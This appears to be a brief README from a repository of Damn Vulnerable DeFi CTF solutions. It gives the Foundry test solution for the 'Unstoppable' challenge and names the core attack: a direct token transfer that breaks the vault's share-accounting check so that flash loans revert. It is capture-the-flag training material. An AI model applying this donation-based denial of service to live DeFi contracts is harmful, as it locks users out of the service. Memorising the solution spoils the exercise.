# CTF-Defi
Damn Vulnerable DeFi CTF challenges
## Unstoppable
Test file solution:
```
    function test_unstoppable() public checkSolvedByPlayer {
       
        token.transfer(address(vault),1e18);
        vm.expectRevert("UNAUTHORIZED");
        monitorContract.checkFlashLoan(100e18);

    }
```

core attack on:
```
convertToShares(totalSupply) != balanceBefore
```
